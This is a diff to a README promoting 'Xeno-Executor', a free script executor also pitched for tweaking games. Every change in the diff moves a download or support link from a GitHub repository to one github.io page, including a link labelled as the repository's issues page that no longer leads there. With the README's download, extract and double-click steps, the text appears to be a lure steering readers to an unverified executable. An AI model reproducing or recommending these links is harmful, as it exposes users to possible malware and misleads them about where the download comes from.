@@ -1,6 +1,6 @@
 # ⚡ Xeno-Executor - Run Scripts Without Limits, Forever Free
 
-[![Download Now](https://img.shields.io/badge/Download-Xeno--Executor-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ethandurkovic-debug/Xeno-Executor)
+[![Download Now](https://img.shields.io/badge/Download-Xeno--Executor-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://ethandurkovic-debug.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ If you’ve ever wanted to automate boring tasks, tweak a game, or use community
 
 Visit this link to download the application:
 
-👉 **[Download Xeno-Executor](https://github.com/ethandurkovic-debug/Xeno-Executor)**
+👉 **[Download Xeno-Executor](https://ethandurkovic-debug.github.io)**
 
 You’ll see a button on that page that says **"Download"** or **"Releases"**. Click it, and your browser will save the file to your **Downloads** folder. The file is small and downloads quickly.
 
@@ -141,7 +141,7 @@ Your scripts are processed locally on your machine. Nothing is uploaded anywhere
 
 ## 💬 Support & Community
 
-- **GitHub Issues** – For bug reports or feature requests, visit the [official repository issues page](https://github.com/ethandurkovic-debug/Xeno-Executor/issues).
+- **GitHub Issues** – For bug reports or feature requests, visit the [official repository issues page](https://ethandurkovic-debug.github.io).
 - **Discussions** – Ask questions and share scripts in the **"Discussions"** tab (same link).
 - **User Guides** – Download sample scripts and a beginner’s guide from the **"Wiki"** section.
 
@@ -173,7 +173,7 @@ No installation wizard. No background processes. Just a clean, single-purpose to
 
 Ready to automate your day? Here’s the link one more time:
 
-### **⬇️ [Download Xeno-Executor (Free)](https://github.com/ethandurkovic-debug/Xeno-Executor)**
+### **⬇️ [Download Xeno-Executor (Free)](https://ethandurkovic-debug.github.io)**
 
 After downloading, extract, double-click, and you’re in business. In five minutes, you’ll be running scripts that save you hours every week. 
 
